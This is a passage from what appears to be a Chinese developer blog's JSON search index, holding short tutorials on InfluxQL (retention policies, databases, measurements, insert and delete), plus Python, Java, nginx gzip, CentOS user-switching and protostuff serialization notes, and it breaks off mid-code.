上面的定义和前面创建基本一致，下面给出一个case 4. 删除保存策略1DROP RETENTION POLICY &lt;retention_policy_name&gt; ON &lt;database_name&gt; 当如下面的case，删除了默认的策略之后，会发现居然没有了默认的保存策略了，这个时候可能需要注意下，手动指定一个 II. 进阶说明前面虽然介绍了保存策略的增删改查，但是这个东西究竟有什么用，又可以怎么用呢？ 看一下前面查看保存策略的图 从前面的查看，可以看到保存策略主要有三个关键信息，数据保存时间,数据分片时间,副本数 1. 保存时间duration 这一列，表示的就是这个策略定义的数据保存时间 因为我们知道每条记录都有一个time表明这条记录的时间戳，如果当前时间与这条记录的time之间差值，大于duration，那么这条数据就会被删除掉 注意 默认的保存策略autogen中的duraiton=0，这里表示这条数据不会被删除 2. 分片时间简单理解为每个分片的时间跨度，比如上面的1_d这个策略中，数据保存最近24小时的，每个小时一个分组 我们在创建数据策略的时候，大多时候都没有指定这个值，系统给出的方案如下 Retention Policy’s DURATION Shard Group Duration &lt; 2 days 1 hour &gt;= 2 days and &lt;= 6 months 1 day &gt; 6 months 7 days 3. 副本副本这个指定了数据有多少个独立的备份存在 4. 场景说明了解上面的几个参数之后，可以预见保存策略有个好的地方在于删除过期数据，比如使用influx来存日志，我只希望查看最近一个月的数据，这个时候指定一个duration时间为30天的保存策略，然后添加数据时，指定这个保存策略，就不需要自己来关心日志删除的问题了 II. 其他0. 系列博文 190718-Influx Sql系列教程一：database 数据库 190717-Influx Sql系列教程零：安装及influx-cli使用姿势介绍 190509-InfluxDb之时间戳显示为日期格式 190506-InfluxDB之配置修改 190505-InfluxDB之权限管理 180727-时序数据库InfluxDB之备份和恢复策略 180726-InfluxDB基本概念小结 180725-InfluxDB-v1.6.0安装和简单使用小结 参考博文 Database management using InfluxQL 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/07/19/190719-Influx-Sql系列教程二：retention-policy-保存策略/"},{"title":"190718-Influx Sql系列教程一：database 数据库","text":"对于influxdb而言，database和我们更熟悉的mysql中的dababse没有什么特别的区别，可以将数据库简单理解为一堆表(measurement)的集合，接下来我们将看一下在influxdb中，database的常规操作 1. 查看当前数据库如果需要查询当前有哪些数据库，可以通过show语句来实现 1show database 上面的_internal是内置的数据库 2. 创建数据库1create database yhh 创建一个名为yhh的数据库 3. 使用数据库如果需要查询某个measurement的数据时，首先需要进入到对应的数据库，直接使用use语句即可 1use yhh = 4. 删除数据库数据库的删除，需要慎重，因为会删除其中所有的数据，属于高危操作 1drop database yhh II. 其他0. 系列博文 190717-Influx Sql系列教程零：安装及influx-cli使用姿势介绍 190509-InfluxDb之时间戳显示为日期格式 190506-InfluxDB之配置修改 190505-InfluxDB之权限管理 180727-时序数据库InfluxDB之备份和恢复策略 180726-InfluxDB基本概念小结 180725-InfluxDB-v1.6.0安装和简单使用小结 参考博文 Database management using InfluxQL 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/07/18/190718-Influx-Sql系列教程一：database-数据库/"},{"title":"190721-Influx Sql系列教程三：measurement 表","text":"在influxdb中measurement相当于mysql中的表，可以理解为一条一条记录都是存与measurent中的，一个数据库中可以有多个measurement，一个measurement中可以存很多的数据。虽然可将measurement类比为mysql中的表，但是他们之间的差别也挺明显的 首先我们先了解一下measurement的几个常用命令，如何查看、新增删除 1. show measurements查看一个数据库中有哪些measurement，属于常规操作了 先确定数据库 执行show measurements 查看当前数据库的所有measurement 1234567&gt; use testUsing database test&gt; show measurementsname: measurementsname----yhh 我们也可以在不执行use databaseName的时候，进行查看；而且还支持按名进行匹配，语法为 1SHOW MEASUREMENTS [ON &lt;database_name&gt;] [WITH MEASUREMENT &lt;regular_expression&gt;] [WHERE &lt;tag_key&gt; &lt;operator&gt; ['&lt;tag_value&gt;' | &lt;regular_expression&gt;]] [LIMIT_clause] [OFFSET_clause] 下面给出查询指定数据库中，以yhh开头的所有measurement示例 1234567891011121314&gt; show measurements on testname: measurementsname----doraemondoraemon2yhhyhh2&gt; show measurements on test with measurement =~ /yhh*/name: measurementsname----yhhyhh2 2. 创建measurement在influxdb中没有专门用来创建measurement的命令，在执行向某个measurement新增记录的时候，如果不存在measurement，则会新创建一个 下面是一条简单的演示case 1234567891011# 像userInfo中新增一条记录，如果userInfo这个measurement不存在，则新建一个&gt; insert userInfo,name=一灰灰blog userId=10,blog=\"https://blog.hhui.top/\"&gt; show measurementsname: measurementsname----doraemondoraemon2userInfoyhhyhh2 3. 删除measurement两种方式，一个是把measurement里面的所有数据都删完，那么这个measurement就没了 1234567891011121314151617&gt; select * from userInfoname: userInfotime blog name userId---- ---- ---- ------1563712849953792293 https://blog.hhui.top/ 一灰灰blog 10# 删除userInfo中的记录&gt; delete from userInfo where time=1563712849953792293# 再次查看，发现userInfo已经被删除&gt; show measurementsname: measurementsname----doraemondoraemon2yhhyhh2&gt; 另外一种方式就是直接使用drop measurement命令实现删除 12345678910111213141516171819202122# 先创建userInfo&gt; insert userInfo,name=一灰灰blog userId=10,blog=\"https://blog.hhui.top/\"&gt; show measurementsname: measurementsname----doraemondoraemon2userInfoyhhyhh2# 直接使用drop语句删除&gt; drop measurement userInfo&gt; show measurementsname: measurementsname----doraemondoraemon2yhhyhh2&gt; 4. 修改不同于mysql中的表，measurement是没有修改操作的，从前面的创建操作也可以看出，对于measurement而言，也就只有一个名字，那如果我希望重命名现有的measurement，该怎么办？ 原则上不建议这么干，如果确实有需要，可以用下面的方式来变相实现 123456789101112131415161718192021222324252627282930313233343536&gt; show measurementsname: measurementsname----doraemondoraemon2userInfoyhhyhh2# 使用select into语句实现将查询结果保存到另外一个measurement中&gt; select * into userBaseInfo from userInfoname: resulttime written---- -------0 1&gt; show measurementsname: measurementsname----doraemondoraemon2userBaseInfouserInfoyhhyhh2&gt; select * from userBaseInfo, userInfoname: userBaseInfotime blog name name_1 userId---- ---- ---- ------ ------1563713690876924095 https://blog.hhui.top/ 一灰灰blog 10name: userInfotime blog name name_1 userId---- ---- ---- ------ ------1563713690876924095 https://blog.hhui.top/ 一灰灰blog 10&gt; II. 其他0. 系列博文 190719-Influx Sql系列教程二：retention policy 保存策略 190717-Influx Sql系列教程零：安装及influx-cli使用姿势介绍 190509-InfluxDb之时间戳显示为日期格式 190506-InfluxDB之配置修改 190505-InfluxDB之权限管理 180727-时序数据库InfluxDB之备份和恢复策略 180726-InfluxDB基本概念小结 180725-InfluxDB-v1.6.0安装和简单使用小结 参考博文 https://docs.influxdata.com/influxdb/v1.7/query_language/schema_exploration/#show-series 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/07/21/190721-Influx-Sql系列教程三：measurement-表/"},{"title":"190729-Influx Sql系列教程六：insert 修改数据","text":"在influxdb中没有专门的修改数据的update语句，对于influxdb而言，如果想修改数据，还是得使用我们前面的说到的insert来实现，那么怎么判断一条insert语句是插入还是修改呢? 1. insert数据修改关于insert的使用语法，可以参考上一篇博文：190726-Influx Sql系列教程五：insert 添加数据 这里只是贴一下基本语法 1insert into &lt;retention policy&gt; measurement,tagKey=tagValue fieldKey=fieldValue timestamp 如果我们希望修改一条数据，比如修改既有的field，或者增加/删除field时，我们需要指定具体的时间戳和tag 下面是一个简单的修改演示 1234567891011121314151617&gt; select * from add_test where time=1564149327925320596name: add_testtime age boy email name phone user_id---- --- --- ----- ---- ----- -------1564149327925320596 bangzewu@126.com YiHui 110 20&gt; show tag keys from add_testname: add_testtagKey------namephone&gt; insert add_test,name=YiHui,phone=110 user_id=20,email=\"bangzewu@126.com\",boy=true,age=18i 1564149327925320596&gt; select * from add_test where time=1564149327925320596name: add_testtime age boy email name phone user_id---- --- --- ----- ---- ----- -------1564149327925320596 18 true bangzewu@126.com YiHui 110 20 在上面的case中，我们执行的的insert语句来修改某条已有的记录时，有几个参数必须存在 time: 指定为要要改记录的时间戳 tag: 所有的tag都必须和要修改的数据一致 name=YiHui,phone=110 然后field的内容，会增量修改之前的数据,如下 123456&gt; insert add_test,name=YiHui,phone=110 boy=true,age=19i 1564149327925320596&gt; select * from add_test where time=1564149327925320596name: add_testtime age boy email name phone user_id---- --- --- ----- ---- ----- -------1564149327925320596 19 true bangzewu@126.com YiHui 110 20 通过上面的insert，可以动态新增field，但是如果我希望删除field怎么办？ 目前提供的influxdb sql中没有找到删除field的方式，一个可供选择的方式就是把原来的记录删掉；然后再重新插入一条 如果需要修改tag怎么办？ 前面的case已经表明，修改记录是根据 time + tag values来唯一定位记录，然后执行删除的，如果你需要修改一个tag，对insert语句而言就是新增了一个point；这个时候可以考虑由自己来删除旧的数据 II. 其他0. 系列博文 190726-Influx Sql系列教程五：insert 添加数据 190723-Influx Sql系列教程四：series/point/tag/field 190721-Influx Sql系列教程三：measurement 表 190719-Influx Sql系列教程二：retention policy 保存策略 190718-Influx Sql系列教程一：database 数据库 190717-Influx Sql系列教程零：安装及influx-cli使用姿势介绍 190509-InfluxDb之时间戳显示为日期格式 190506-InfluxDB之配置修改 190505-InfluxDB之权限管理 180727-时序数据库InfluxDB之备份和恢复策略 180726-InfluxDB基本概念小结 180725-InfluxDB-v1.6.0安装和简单使用小结 参考博文 https://docs.influxdata.com/influxdb/v1.7/concepts/glossary https://docs.influxdata.com/influxdb/v1.7/query_language/schema_exploration https://docs.influxdata.com/influxdb/v1.7/tools/shell/#write-data-to-influxdb-with-insert 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/07/29/190729-Influx-Sql系列教程六：insert-修改数据/"},{"title":"190809-Centos用户无法切换问题记录","text":"使用influxdb时，需要执行一个命令时，要求切换到influxdb的用户下，发现通过 su influxdb 居然切不过去，特此记录一下 因为influxdb这个用户是安装influxdb时自动创建的，并不是我们一般的用户角色，查看文件 vim /etc/passwd 找到inflxudb用于对应的记录，发现如下 1influxdb:x:996:992::/var/lib/influxdb:/bin/false 导致我们切不过去的主要原因就是后面的/bin/false，需要修改为 1influxdb:x:996:992::/var/lib/influxdb:/bin/bash 然后再次执行用户切换，ok II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/08/09/190809-Centos用户无法切换问题记录/"},{"title":"190730-Influx Sql系列教程七：delete 删除数据","text":"前面介绍了使用insert实现新增和修改记录的使用姿势，接下来我们看一下另外一个简单的使用方式，如何删除数据 1. delete 语句delete的官方语法如下 1DELETE FROM &lt;measurement_name&gt; WHERE [&lt;tag_key&gt;='&lt;tag_value&gt;'] | [&lt;time interval&gt;] delete语句和我们常见sql语法有点像，但是注意一下上面的where中的条件，只允许根据tag和时间来进行删除操作 下面给出几个简单的例子 case1 根据时间删除 1234567891011121314&gt; select * from add_testname: add_testtime age boy email name phone user_id---- --- --- ----- ---- ----- -------1564149327925320596 19 true bangzewu@126.com YiHui 110 01564149920283253824 18 true bangzewu@126.com YiHui 110 211564150279123000000 18 true bangzewu@126.com YiHui 110 22&gt; delete from add_test where time&gt;=1564150279123000000&gt; select * from add_testname: add_testtime age boy email name phone user_id---- --- --- ----- ---- ----- -------1564149327925320596 19 true bangzewu@126.com YiHui 110 01564149920283253824 18 true bangzewu@126.com YiHui 110 21 case2 根据tag删除 注意name为保留名，因此需要用双引号括起来 123456789&gt; show tag keys from add_testname: add_testtagKey------namephone&gt; delete from add_test where \"name\"='YiHui'&gt; select * from add_test&gt; 2. 不同保存策略的数据删除从前面的语法定义中，没有看到指定保留策略的情况，那么如果需要删除某个保存策略的数据，应该怎样？ 1234567891011121314151617&gt; insert add_test,name=YiHui,phone=110 boy=true,age=19i,user_id=2&gt; insert into \"1D\" add_test,name=YiHui,phone=110 boy=true,age=19i,user_id=1&gt; select * from add_testname: add_testtime age boy name phone user_id---- --- --- ---- ----- -------1564483471390538399 19 true YiHui 110 2&gt; select * from \"1D\".add_testname: add_testtime age boy name phone user_id---- --- --- ---- ----- -------1564483483748916258 19 true YiHui 110 1&gt; delete from add_test where \"name\"='YiHui'&gt; select * from add_test&gt; select * from \"1D\".add_test&gt; 执行上面的case之后，发现根据tag进行删除时，默认策略，和”1D”保存策略中的数据都被删除掉了 下面是另外一个验证 123456789101112131415161718&gt; select * from add_test;name: add_testtime age boy name phone user_id---- --- --- ---- ----- -------1564483778197609864 19 true YiHui 110 1&gt; insert into \"2_h\" add_test,name=YiHui,phone=110 boy=true,age=19i,user_id=1&gt; select * from \"2_h\".add_test;name: add_testtime age boy name phone user_id---- --- --- ---- ----- -------1564483793280811751 19 true YiHui 110 1&gt; delete from add_test where time=1564483793280811751&gt; select * from \"2_h\".add_test;&gt; select * from add_test;name: add_testtime age boy name phone user_id---- --- --- ---- ----- -------1564483778197609864 19 true YiHui 110 1 我们在&quot;2_h&quot;这个策略中新增了一条数据，直接根据时间进行删除，当前的策略下的数据没有影响，&quot;2_h&quot;策略中刚添加的数据被删除掉了 II. 其他0. 系列博文 190729-Influx Sql系列教程六：insert 修改数据 190726-Influx Sql系列教程五：insert 添加数据 190723-Influx Sql系列教程四：series/point/tag/field 190721-Influx Sql系列教程三：measurement 表 190719-Influx Sql系列教程二：retention policy 保存策略 190718-Influx Sql系列教程一：database 数据库 190717-Influx Sql系列教程零：安装及influx-cli使用姿势介绍 190509-InfluxDb之时间戳显示为日期格式 190506-InfluxDB之配置修改 190505-InfluxDB之权限管理 180727-时序数据库InfluxDB之备份和恢复策略 180726-InfluxDB基本概念小结 180725-InfluxDB-v1.6.0安装和简单使用小结 参考博文 https://docs.influxdata.com/influxdb/v1.7/concepts/glossary https://docs.influxdata.com/influxdb/v1.7/query_language/schema_exploration https://docs.influxdata.com/influxdb/v1.7/tools/shell/#write-data-to-influxdb-with-insert https://docs.influxdata.com/influxdb/v1.7/query_language/database_management/#delete-series-with-delete 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/07/30/190730-Influx-Sql系列教程七：delete-删除数据/"},{"title":"190716 Python 内置函数之open","text":"打开文件，常配合with语句使用 语法 1open(file, mode='r', buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None) 参数说明 file: 必需，文件路径（相对或者绝对路径）。 mode: 可选，文件打开模式 buffering: 设置缓冲 encoding: 一般使用utf8 errors: 报错级别 newline: 区分换行符 closefd: 传入的file参数类型 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之open/"},{"title":"190808-Python CSV读写解决中文乱码问题","text":"一般而言，我并不会直接操作excel文件，如果需要输出表格的时候，我会选择csv文件，用英文逗号来分割不同的单元格；csv文件的优点是简单，文本格式，vim可以直接打开编辑，excel也可以打开可以方便的转换为excel文档；可以说即适合开发人员，也适合给运营同学 然而有个蛋疼的问题，csv文件中文乱码问题，下面记录下，在python中如何解决 1. csv中文乱码python自带csv库，不需要额外安装，可以直接使用，一般的使用姿势也比较简单，如下，一个简单的使用case 12345678910111213import csvrows = [['中文', '啥米东东', '3'], ['☺️da', 'da5dd', '!26asdf']]with open('my.csv', 'w+', newline='') as csv_file: writer = csv.writer(csv_file) for row in rows: writer.writerow(row)with open('my.csv', 'r+', newline='') as csv_file: reader = csv.reader(csv_file) for row in reader: print(str(row)) 上面的代码执行结果如下 直接通过代码读取数据，发现并没有什么问题，中文也是正常输出，但是用excel打开这个文件时，发下长下面这样 这种乱码，多半是因为编码格式的问题，如果我们需要支持中文，则需要指定一下编码格式 123456789import codecsimport csvrows = [['中文', '啥米东东', '3'], ['☺️da', 'da5dd', '!26asdf']]with open('my.csv', 'w+', newline='') as csv_file: csv_file.write(codecs.BOM_UTF8.decode()) writer = csv.writer(csv_file) for row in rows: writer.writerow(row) 注意代码行: csv_file.write(codecs.BOM_UTF8.decode())，指定写入文本的编码格式，然后再次执行之后结果为 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/08/08/190808-Python-CSV读写解决中文乱码问题/"},{"title":"190716 Python 内置函数之locals","text":"与global对象，返回全部局部变量 123456&gt;&gt;&gt; def m():... a = 10... print(locals())...&gt;&gt;&gt; m(){'a': 10} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之locals/"},{"title":"190909-Java之输出异常堆栈信息","text":"在代码出现异常时，堆栈信息可以有效的辅助定位和排除问题，异常堆栈一般是怎么打印的呢 下面是一个简单的输出cas 1234567891011121314private int divide(int a) { return a / 0;}@Testpublic void test() { try { divide(10); } catch (Exception e) { System.out.println(e); System.out.println(\"----------\"); e.printStackTrace(); }} 直接使用 System.out输出时，看不到堆栈信息；使用e.printStackTrace();可以看到堆栈信息，输出如下 123456789101112131415161718192021222324252627java.lang.ArithmeticException: / by zero----------java.lang.ArithmeticException: / by zero at com.git.hui.print.PrintTest.divide(LogUtilTest.java:11) at com.git.hui.print.PrintTest.test(LogUtilTest.java:17) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:50) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:47) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:78) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:57) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) at org.junit.runners.ParentRunner.run(ParentRunner.java:363) at org.junit.runner.JUnitCore.run(JUnitCore.java:137) at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:68) at com.intellij.rt.execution.junit.IdeaTestRunner$Repeater.startRunnerWithArgs(IdeaTestRunner.java:47) at com.intellij.rt.execution.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:242) at com.intellij.rt.execution.junit.JUnitStarter.main(JUnitStarter.java:70) 当然在我们实际的项目中，一般既不会使用e.printStackTrace();方式输出异常堆栈，也不会使用System.out方式输出；更常见的是通过专用的日志组件来处理，比如logback,slf4j2等 前不久做支持一个java动态编译运行的项目时，遇到的一个问题是我们通过控制台来控制某块java代码的执行，如果出现异常时，我希望将异常堆栈返回给控制台来查看，所以我希望可以从Throwable中获取堆栈信息，并转成String，那么可以怎么做呢？ 主要的实现就是参考e.printStackTrace的实现，将输出到控制台的流，转换为我们自定义的额字符流 1234567891011public static String getThrowableStackInfo(Throwable e) { ByteArrayOutputStream buf = new ByteArrayOutputStream(); e.printStackTrace(new java.io.PrintWriter(buf, true)); String msg = buf.toString(); try { buf.close(); } catch (Exception t) { return e.getMessage(); } return msg;} 然后再次测试，结果如下 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/09/09/190909-Java之输出异常堆栈信息/"},{"title":"191015-Python markdown转html","text":"本篇将介绍如何利用python来实现markdown文档转html 1. 依赖安装我们主要借助 python-markdown这库来实现markdown转html的功能，官方安装教程如下 https://python-markdown.github.io/install/ python的依赖包安装相对简单，直接使用pip 1pip install markdown 2. 使用说明 官方使用教程: [https://python-markdown.github.io/reference/]https://python-markdown.github.io/reference/() 基本的使用姿势比较简单，两行代码即可 12import markdown html = markdown.markdown(text) 然后写一个简单的demo测试一下，测试的markdown文件内容如下 12345678910111213import codecsimport markdown # 读取markdown文档md_file = codecs.open('text.md', mode='r', encoding='utf-8')md_content = md_file.read()# 渲染md_html = markdown.markdown(md_content)# 输出html文档save_file = codecs.open('out.html', 'w', encoding='utf-8', errors=\"xmlcharrefreplace\")save_file.write(md_html) 渲染结果如下 123456789101112131415&lt;h1&gt;标题&lt;/h1&gt;&lt;blockquote&gt;&lt;p&gt;这个是文章标题&lt;/p&gt;&lt;/blockquote&gt;&lt;h2&gt;段落&lt;/h2&gt;&lt;p&gt;第一行哈哈哈&lt;/p&gt;&lt;h3&gt;sec.1&lt;/h3&gt;&lt;p&gt;&lt;code&gt;pythonimport markdownhtml = markdown.markdown(text)&lt;/code&gt;&lt;/p&gt;&lt;h3&gt;sec.2&lt;/h3&gt;&lt;p&gt;第二节小内容。。。&lt;/p&gt;&lt;h2&gt;关于&lt;/h2&gt;&lt;p&gt;我是一灰灰，请关注我的微信公众号，感谢支持&lt;/p&gt;&lt;p&gt;&lt;img alt=\"\" src=\"https://spring.hhui.top/spring-blog/imgs/info/info.png\" /&gt;&lt;/p&gt; II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/10/15/191015-Python-markdown转html/"},{"title":"190716 Python 内置函数之print","text":"可以说是最常见的一个函数了，除了常见的输出在终端之外，还支持输出到文件 语法定义 1print(*objects, sep=' ', end='\\n', file=sys.stdout, flush=False) objects: 输出的对象，用英文逗号分隔 sep: 多个对象输出时，间隔符号 end: 结尾符号 file: 写入的文件对象,sys.stdout标准输出 flush: 写文件时，如果设置True，表示强制刷新 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之print/"},{"title":"191121-Python 科学计数法误用引起的血案","text":"记录一个代码中误用科学计数法导致所有的数据增大十倍的问题 科学计数法用e表示，后面跟上数字n，表示10的n次方；然后10^8用科学计算法怎么写？ 正确写法 11e8 # 前面的1不能缺少 错误用法 110e8 # 这个实际上是10亿 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/11/21/191121-Python-科学计数法误用引起的血案/"},{"title":"191122-nginx 开启gzip压缩配置","text":"ngxin 开启gzip压缩，减少数据包大小，默认场景下nginx没有开启gzip压缩，需要主动指定 关键配置修改如下（进入配置文件 nginx.conf) 123456789101112131415161718192021http { # ... # 开启gzip压缩 gzip on; # 表示当请求的资源超过1k时，才开启压缩 gzip_min_length 1k; # 设置压缩所需要的缓冲区大小 gzip_buffers 4 16k; # 针对的http版本 gzip_http_version 1.0; # 压缩级别，级别越底压缩速度越快文件压缩比越小，反之速度越慢文件压缩比越大 gzip_comp_level 2; # 支持压缩的资源类型，对于前后盾分离的项目而言，注意下json的压缩支持 gzip_types text/plain application/x-javascript text/css application/xml application/json text/javascript application/x-httpd-php image/jpeg image/gif image/png; # 是否在http header中添加Vary: Accept-Encoding，建议开启 gzip_vary off; # 禁用IE 6 gzip gzip_disable &quot;MSIE [1-6]\\.&quot;; } 修改完毕之后重启nginx即可 1nginx -s reload II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/11/22/191122-nginx-开启gzip压缩配置/"},{"title":"190821-ProtoStuff无法反序列化Deprecated注解成员问题记录","text":"今天开发过程中，遇到一个鬼畜的问题，在DO的某个成员上添加@Deprecated注解之后，通过ProtoStuff反序列化得到的DO中，这个成员一直为null；花了不少时间才定位这个问题，特此记录一下 I. 全程实录1. 环境相关原项目中使用protostuff作为POJO序列化工具，对应的版本为 12345678910&lt;dependency&gt; &lt;groupId&gt;io.protostuff&lt;/groupId&gt; &lt;artifactId&gt;protostuff-runtime&lt;/artifactId&gt; &lt;version&gt;1.5.9&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.protostuff&lt;/groupId&gt; &lt;artifactId&gt;protostuff-core&lt;/artifactId&gt; &lt;version&gt;1.5.9&lt;/version&gt;&lt;/dependency&gt; 2. 场景复现写了一个简单的demo，我们在POJO中添加一个拥有删除注解的成员，然后查看下反序列化结果 123456789101112131415161718192021222324252627@Data@NoArgsConstructor@AllArgsConstructorpublic static class BDO implements Serializable { private String a; @Deprecated private String b;}@Testpublic void testSer() { BDO b = new BDO(\"10\", \"20\"); Schema&lt;BDO&gt; schema = RuntimeSchema.getSchema(BDO.class); LinkedBuffer buffer = LinkedBuffer.allocate(512); final byte[] protostuff; try { protostuff = ProtostuffIOUtil.toByteArray(b, schema, buffer); } finally { buffer.clear(); } // deser BDO fooParsed = schema.newMessage(); ProtostuffIOUtil.mergeFrom(protostuff, fooParsed, schema); System.out.println(fooParsed);} 下面是测试输出，可以看到反序列化的结果中，b为null 自然就会有个疑问，是在序列化的时候直接丢掉了这个成员信息呢，还是反序列化的时候跳过了这个成员？ 我们新增一个POJO，与BDO的成员类似，只是没有@Deprecated注解 1234567@Data@NoArgsConstructor@AllArgsConstructorpublic static class NDO implements Serializable { private String a; private String b;} 然后验证下BDO序列化的结果，通过反序列化为NDO对象，如果b成员有值，说明在序列化的时候并没有丢掉； 123456789101112131415161718@Testpublic void testSer2() { BDO b = new BDO(\"10\", \"20\"); Schema&lt;BDO&gt; schema = RuntimeSchema.getSchema(BDO.class); LinkedBuffer buffer = LinkedBuffer.allocate(512); final byte[] protostuff; try { protostuff 